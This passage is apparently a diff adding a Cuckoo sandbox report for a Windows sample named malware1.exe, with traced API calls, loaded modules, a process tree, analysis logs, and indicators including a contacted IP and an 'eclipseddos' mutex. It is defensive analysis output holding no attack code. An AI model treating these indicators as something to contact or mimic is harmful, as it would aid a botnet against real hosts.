+                        "category": "registry", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtOpenKey", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "key_handle": "0x0000005c", 
+                            "desired_access": "0x00020019", 
+                            "regkey": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\GRE_Initialize"
+                        }, 
+                        "time": 1601052899.60875, 
+                        "tid": 2248, 
+                        "flags": {
+                            "desired_access": "READ_CONTROL"
+                        }
+                    }, 
+                    {
+                        "category": "registry", 
+                        "status": 0, 
+                        "stacktrace": [], 
+                        "last_error": 0, 
+                        "nt_status": -1073741568, 
+                        "api": "NtQueryValueKey", 
+                        "return_value": 3221225524, 
+                        "arguments": {
+                            "key_handle": "0x0000005c", 
+                            "key_name": "", 
+                            "value": "", 
+                            "reg_type": 0, 
+                            "information_class": 2, 
+                            "regkey": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\GRE_Initialize\\DisableMetaFiles"
+                        }, 
+                        "time": 1601052899.62475, 
+                        "tid": 2248, 
+                        "flags": {
+                            "reg_type": "REG_NONE", 
+                            "information_class": "KeyValuePartialInformation"
+                        }
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x0000005c"
+                        }, 
+                        "time": 1601052899.62475, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x0000003c"
+                        }, 
+                        "time": 1601052899.62475, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x00000034"
+                        }, 
+                        "time": 1601052899.62475, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }, 
+                    {
+                        "category": "system", 
+                        "status": 1, 
+                        "stacktrace": [], 
+                        "api": "NtClose", 
+                        "return_value": 0, 
+                        "arguments": {
+                            "handle": "0x00000038"
+                        }, 
+                        "time": 1601052899.62475, 
+                        "tid": 2248, 
+                        "flags": {}
+                    }
+                ], 
+                "track": true, 
+                "pid": 2044, 
+                "process_name": "malware1.exe", 
+                "command_line": "\"C:\\Users\\Administrator.john-PC\\AppData\\Local\\Temp\\malware1.exe\" ", 
+                "modules": [
+                    {
+                        "basename": "malware1.exe", 
+                        "imgsize": 110592, 
+                        "baseaddr": "0x400000", 
+                        "filepath": "C:\\Users\\Administrator.john-PC\\AppData\\Local\\Temp\\malware1.exe"
+                    }, 
+                    {
+                        "basename": "ntdll.dll", 
+                        "imgsize": 1572864, 
+                        "baseaddr": "0x77d80000", 
+                        "filepath": "C:\\Windows\\SysWOW64\\ntdll.dll"
+                    }, 
+                    {
+                        "basename": "kernel32.dll", 
+                        "imgsize": 1114112, 
+                        "baseaddr": "0x75a00000", 
+                        "filepath": "C:\\Windows\\syswow64\\kernel32.dll"
+                    }, 
+                    {
+                        "basename": "KERNELBASE.dll", 
+                        "imgsize": 286720, 
+                        "baseaddr": "0x77680000", 
+                        "filepath": "C:\\Windows\\syswow64\\KERNELBASE.dll"
+                    }, 
+                    {
+                        "basename": "USER32.dll", 
+                        "imgsize": 1048576, 
+                        "baseaddr": "0x76800000", 
+                        "filepath": "C:\\Windows\\syswow64\\USER32.dll"
+                    }, 
+                    {
+                        "basename": "GDI32.dll", 
+                        "imgsize": 589824, 
+                        "baseaddr": "0x76730000", 
+                        "filepath": "C:\\Windows\\syswow64\\GDI32.dll"
+                    }, 
+                    {
+                        "basename": "LPK.dll", 
+                        "imgsize": 40960, 
+                        "baseaddr": "0x77d50000", 
+                        "filepath": "C:\\Windows\\syswow64\\LPK.dll"
+                    }, 
+                    {
+                        "basename": "USP10.dll", 
+                        "imgsize": 643072, 
+                        "baseaddr": "0x775e0000", 
+                        "filepath": "C:\\Windows\\syswow64\\USP10.dll"
+                    }, 
+                    {
+                        "basename": "msvcrt.dll", 
+                        "imgsize": 704512, 
+                        "baseaddr": "0x75e10000", 
+                        "filepath": "C:\\Windows\\syswow64\\msvcrt.dll"
+                    }, 
+                    {
+                        "basename": "ADVAPI32.dll", 
+                        "imgsize": 655360, 
+                        "baseaddr": "0x76090000", 
+                        "filepath": "C:\\Windows\\syswow64\\ADVAPI32.dll"
+                    }, 
+                    {
+                        "basename": "sechost.dll", 
+                        "imgsize": 102400, 
+                        "baseaddr": "0x75ec0000", 
+                        "filepath": "C:\\Windows\\SysWOW64\\sechost.dll"
+                    }, 
+                    {
+                        "basename": "RPCRT4.dll", 
+                        "imgsize": 983040, 
+                        "baseaddr": "0x76640000", 
+                        "filepath": "C:\\Windows\\syswow64\\RPCRT4.dll"
+                    }, 
+                    {
+                        "basename": "SspiCli.dll", 
+                        "imgsize": 393216, 
+                        "baseaddr": "0x758e0000", 
+                        "filepath": "C:\\Windows\\syswow64\\SspiCli.dll"
+                    }, 
+                    {
+                        "basename": "CRYPTBASE.dll", 
+                        "imgsize": 49152, 
+                        "baseaddr": "0x758d0000", 
+                        "filepath": "C:\\Windows\\syswow64\\CRYPTBASE.dll"
+                    }, 
+                    {
+                        "basename": "SHELL32.dll", 
+                        "imgsize": 12886016, 
+                        "baseaddr": "0x76900000", 
+                        "filepath": "C:\\Windows\\syswow64\\SHELL32.dll"
+                    }, 
+                    {
+                        "basename": "SHLWAPI.dll", 
+                        "imgsize": 356352, 
+                        "baseaddr": "0x75db0000", 
+                        "filepath": "C:\\Windows\\syswow64\\SHLWAPI.dll"
+                    }, 
+                    {
+                        "basename": "ole32.dll", 
+                        "imgsize": 1425408, 
+                        "baseaddr": "0x77720000", 
+                        "filepath": "C:\\Windows\\syswow64\\ole32.dll"
+                    }, 
+                    {
+                        "basename": "WININET.dll", 
+                        "imgsize": 1003520, 
+                        "baseaddr": "0x77880000", 
+                        "filepath": "C:\\Windows\\syswow64\\WININET.dll"
+                    }, 
+                    {
+                        "basename": "urlmon.dll", 
+                        "imgsize": 1269760, 
+                        "baseaddr": "0x75c70000", 
+                        "filepath": "C:\\Windows\\syswow64\\urlmon.dll"
+                    }, 
+                    {
+                        "basename": "OLEAUT32.dll", 
+                        "imgsize": 585728, 
+                        "baseaddr": "0x75be0000", 
+                        "filepath": "C:\\Windows\\syswow64\\OLEAUT32.dll"
+                    }, 
+                    {
+                        "basename": "CRYPT32.dll", 
+                        "imgsize": 1167360, 
+                        "baseaddr": "0x761b0000", 
+                        "filepath": "C:\\Windows\\syswow64\\CRYPT32.dll"
+                    }, 
+                    {
+                        "basename": "MSASN1.dll", 
+                        "imgsize": 49152, 
+                        "baseaddr": "0x76130000", 
+                        "filepath": "C:\\Windows\\syswow64\\MSASN1.dll"
+                    }, 
+                    {
+                        "basename": "iertutil.dll", 
+                        "imgsize": 2076672, 
+                        "baseaddr": "0x76380000", 
+                        "filepath": "C:\\Windows\\syswow64\\iertutil.dll"
+                    }, 
+                    {
+                        "basename": "WS2_32.dll", 
+                        "imgsize": 217088, 
+                        "baseaddr": "0x767c0000", 
+                        "filepath": "C:\\Windows\\syswow64\\WS2_32.dll"
+                    }, 
+                    {
+                        "basename": "NSI.dll", 
+                        "imgsize": 24576, 
+                        "baseaddr": "0x75ee0000", 
+                        "filepath": "C:\\Windows\\syswow64\\NSI.dll"
+                    }, 
+                    {
+                        "basename": "IMM32.DLL", 
+                        "imgsize": 393216, 
+                        "baseaddr": "0x76140000", 
+                        "filepath": "C:\\Windows\\system32\\IMM32.DLL"
+                    }, 
+                    {
+                        "basename": "MSCTF.dll", 
+                        "imgsize": 835584, 
+                        "baseaddr": "0x75b10000", 
+                        "filepath": "C:\\Windows\\syswow64\\MSCTF.dll"
+                    }, 
+                    {
+                        "basename": "monitor-x86.dll", 
+                        "imgsize": 2117632, 
+                        "baseaddr": "0x739b0000", 
+                        "filepath": "C:\\tmpegc405\\bin\\monitor-x86.dll"
+                    }
+                ], 
+                "time": 15, 
+                "tid": 2248, 
+                "first_seen": 1601052895.84375, 
+                "ppid": 2112, 
+                "type": "process"
+            }
+        ], 
+        "processtree": [
+            {
+                "track": false, 
+                "pid": 484, 
+                "process_name": "lsass.exe", 
+                "command_line": "C:\\Windows\\system32\\lsass.exe", 
+                "first_seen": 1601052893.890625, 
+                "ppid": 376, 
+                "children": []
+            }, 
+            {
+                "track": true, 
+                "pid": 2044, 
+                "process_name": "malware1.exe", 
+                "command_line": "\"C:\\Users\\Administrator.john-PC\\AppData\\Local\\Temp\\malware1.exe\" ", 
+                "first_seen": 1601052895.84375, 
+                "ppid": 2112, 
+                "children": []
+            }
+        ], 
+        "summary": {
+            "connects_ip": [
+                "35.161.124.173"
+            ], 
+            "command_line": [
+                "C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe"
+            ], 
+            "mutex": [
+                "eclipseddos"
+            ], 
+            "regkey_read": [
+                "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\GRE_Initialize\\DisableMetaFiles"
+            ]
+        }
+    }, 
+    "debug": {
+        "action": [], 
+        "dbgview": [], 
+        "errors": [], 
+        "log": [
+            "2020-09-25 13:54:49,342 [analyzer] DEBUG: Starting analyzer from: C:\\tmpegc405\n", 
+            "2020-09-25 13:54:49,358 [analyzer] DEBUG: Pipe server name: \\??\\PIPE\\qfvVtHjWIbovOttdVKoVVfEjRzuD\n", 
+            "2020-09-25 13:54:49,437 [analyzer] DEBUG: Log pipe server name: \\??\\PIPE\\vomeNalAgJPWZUDgiSDYz\n", 
+            "2020-09-25 13:54:50,780 [analyzer] DEBUG: Started auxiliary module DbgView\n", 
+            "2020-09-25 13:54:53,358 [analyzer] DEBUG: Started auxiliary module Disguise\n", 
+            "2020-09-25 13:54:54,000 [analyzer] DEBUG: Loaded monitor into process with pid 484\n", 
+            "2020-09-25 13:54:54,015 [analyzer] DEBUG: Started auxiliary module DumpTLSMasterSecrets\n", 
+            "2020-09-25 13:54:54,046 [analyzer] DEBUG: Started auxiliary module Human\n", 
+            "2020-09-25 13:54:54,108 [analyzer] DEBUG: Started auxiliary module InstallCertificate\n", 
+            "2020-09-25 13:54:54,108 [analyzer] DEBUG: Started auxiliary module Reboot\n", 
+            "2020-09-25 13:54:54,750 [analyzer] DEBUG: Started auxiliary module RecentFiles\n", 
+            "2020-09-25 13:54:54,796 [analyzer] DEBUG: Started auxiliary module Screenshots\n", 
+            "2020-09-25 13:54:54,796 [analyzer] DEBUG: Started auxiliary module LoadZer0m0n\n", 
+            "2020-09-25 13:54:55,453 [lib.api.process] INFO: Successfully executed process from path u'C:\\\\Users\\\\ADMINI~1.JOH\\\\AppData\\\\Local\\\\Temp\\\\malware1.exe' with arguments '' and pid 2044\n", 
+            "2020-09-25 13:54:56,280 [analyzer] DEBUG: Loaded monitor into process with pid 2044\n", 
+            "2020-09-25 13:54:57,717 [modules.auxiliary.human] INFO: Found button u'OK', clicking it\n", 
+            "2020-09-25 13:54:59,562 [analyzer] INFO: Injected into process with pid 2800 and name u'\\u3420\\u024c'\n", 
+            "2020-09-25 13:54:59,967 [modules.auxiliary.human] INFO: Found button u'OK', clicking it\n", 
+            "2020-09-25 13:55:01,562 [analyzer] INFO: Process with pid 2800 has terminated\n", 
+            "2020-09-25 11:28:04,489 [analyzer] INFO: Analysis timeout hit, terminating analysis.\n"
+        ], 
+        "cuckoo": [
+            "2020-09-25 14:17:44,339 [cuckoo.core.scheduler] INFO: Task #3: acquired machine cuckoo1 (label=win7)\n", 
+            "2020-09-25 14:17:44,340 [cuckoo.core.resultserver] DEBUG: Now tracking machine 192.168.56.101 for task #3\n", 
+            "2020-09-25 14:17:44,391 [cuckoo.auxiliary.sniffer] INFO: Started sniffer with PID 3063 (interface=virbr1, host=192.168.56.101)\n", 
+            "2020-09-25 14:17:44,392 [cuckoo.core.plugins] DEBUG: Started auxiliary module: Sniffer\n", 
+            "2020-09-25 14:17:44,821 [cuckoo.common.abstracts] DEBUG: Starting machine win7\n", 
+            "2020-09-25 14:17:44,822 [cuckoo.common.abstracts] DEBUG: Getting status for win7\n", 
+            "2020-09-25 14:17:44,857 [cuckoo.common.abstracts] DEBUG: Using snapshot snapshot2 for virtual machine win7\n", 
+            "2020-09-25 14:17:50,724 [cuckoo.common.abstracts] DEBUG: Getting status for win7\n", 
+            "2020-09-25 14:17:50,797 [cuckoo.core.guest] INFO: Starting analysis #3 on guest (id=cuckoo1, ip=192.168.56.101)\n", 
+            "2020-09-25 14:17:50,918 [cuckoo.core.guest] INFO: Guest is running Cuckoo Agent 0.10 (id=cuckoo1, ip=192.168.56.101)\n", 
+            "2020-09-25 14:17:51,134 [cuckoo.core.guest] DEBUG: Uploading analyzer to guest (id=cuckoo1, ip=192.168.56.101, monitor=latest, size=3884763)\n", 
+            "2020-09-25 14:17:57,252 [cuckoo.core.resultserver] DEBUG: Task #3: live log analysis.log initialized.\n", 
+            "2020-09-25 14:18:00,665 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:18:02,248 [cuckoo.core.resultserver] DEBUG: Task #3 is sending a BSON stream\n", 
+            "2020-09-25 14:18:04,202 [cuckoo.core.resultserver] DEBUG: Task #3 is sending a BSON stream\n", 
+            "2020-09-25 14:18:05,208 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0001.jpg'\n", 
+            "2020-09-25 14:18:05,323 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40520\n", 
+            "2020-09-25 14:18:05,733 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:18:06,543 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0002.jpg'\n", 
+            "2020-09-25 14:18:06,642 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 39682\n", 
+            "2020-09-25 14:18:09,381 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0003.jpg'\n", 
+            "2020-09-25 14:18:09,644 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 39982\n", 
+            "2020-09-25 14:18:10,812 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:18:10,860 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0004.jpg'\n", 
+            "2020-09-25 14:18:10,980 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 39804\n", 
+            "2020-09-25 14:18:14,856 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'memory/2044-1.dmp'\n", 
+            "2020-09-25 14:18:15,912 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:18:20,991 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:18:26,061 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:18:31,128 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:18:36,195 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:18:41,267 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:18:46,331 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:18:51,400 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:18:56,473 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:19:01,556 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:19:06,635 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:19:11,702 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:19:16,759 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:19:21,834 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:19:26,903 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:19:31,978 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:19:37,074 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:19:42,150 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:19:47,221 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:19:52,288 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:19:57,362 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:20:02,444 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:20:07,501 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:20:12,575 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:20:17,647 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:20:22,722 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:20:27,807 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:20:32,877 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:20:38,097 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:20:43,407 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:20:48,476 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:20:53,568 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:20:58,634 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:21:03,701 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:21:08,769 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:21:13,846 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:21:18,919 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:21:24,008 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:21:25,726 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0005.jpg'\n", 
+            "2020-09-25 14:21:25,788 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40137\n", 
+            "2020-09-25 14:21:26,921 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0006.jpg'\n", 
+            "2020-09-25 14:21:26,997 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40072\n", 
+            "2020-09-25 14:21:29,084 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:21:34,166 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:21:39,239 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:21:44,311 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:21:49,375 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:21:54,447 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:21:59,515 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:22:04,588 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:22:09,666 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:22:14,746 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:22:19,822 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:22:24,886 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:22:29,955 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:22:35,028 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:22:40,100 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:22:45,173 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:22:50,231 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:22:55,304 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:23:00,371 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:23:05,464 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:23:10,533 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:23:15,599 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:23:20,670 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:23:25,750 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:23:30,816 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:23:35,884 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:23:39,554 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0007.jpg'\n", 
+            "2020-09-25 14:23:39,636 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40406\n", 
+            "2020-09-25 14:23:40,811 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0008.jpg'\n", 
+            "2020-09-25 14:23:40,876 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40088\n", 
+            "2020-09-25 14:23:40,971 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:23:46,041 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:23:51,130 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:23:56,201 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:24:01,274 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:24:01,297 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0009.jpg'\n", 
+            "2020-09-25 14:24:01,366 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40145\n", 
+            "2020-09-25 14:24:02,540 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0010.jpg'\n", 
+            "2020-09-25 14:24:02,605 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40088\n", 
+            "2020-09-25 14:24:03,760 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0011.jpg'\n", 
+            "2020-09-25 14:24:03,814 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40145\n", 
+            "2020-09-25 14:24:04,944 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0012.jpg'\n", 
+            "2020-09-25 14:24:04,991 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40088\n", 
+            "2020-09-25 14:24:06,341 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:24:11,419 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:24:16,482 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:24:21,556 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:24:22,433 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0013.jpg'\n", 
+            "2020-09-25 14:24:22,557 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40404\n", 
+            "2020-09-25 14:24:23,693 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0014.jpg'\n", 
+            "2020-09-25 14:24:23,760 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40086\n", 
+            "2020-09-25 14:24:26,615 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:24:31,677 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:24:36,736 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:24:41,813 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:24:45,315 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0015.jpg'\n", 
+            "2020-09-25 14:24:45,483 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40404\n", 
+            "2020-09-25 14:24:46,626 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0016.jpg'\n", 
+            "2020-09-25 14:24:46,685 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40086\n", 
+            "2020-09-25 14:24:46,873 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:24:51,932 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:24:57,007 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:25:02,068 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:25:07,151 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:25:12,223 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:25:17,299 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:25:22,376 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:25:24,184 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0017.jpg'\n", 
+            "2020-09-25 14:25:24,276 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40146\n", 
+            "2020-09-25 14:25:25,399 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0018.jpg'\n", 
+            "2020-09-25 14:25:25,468 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40083\n", 
+            "2020-09-25 14:25:27,446 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:25:32,523 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:25:37,598 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:25:42,666 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:25:47,732 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:25:48,159 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0019.jpg'\n", 
+            "2020-09-25 14:25:48,203 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40146\n", 
+            "2020-09-25 14:25:49,320 [cuckoo.core.resultserver] DEBUG: Task #3: File upload for 'shots/0020.jpg'\n", 
+            "2020-09-25 14:25:49,373 [cuckoo.core.resultserver] DEBUG: Task #3 uploaded file length: 40083\n", 
+            "2020-09-25 14:25:52,813 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:25:57,883 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:26:02,956 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:26:08,027 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:26:13,097 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:26:18,193 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
+            "2020-09-25 14:26:23,254 [cuckoo.core.guest] DEBUG: cuckoo1: analysis #3 still processing\n", 
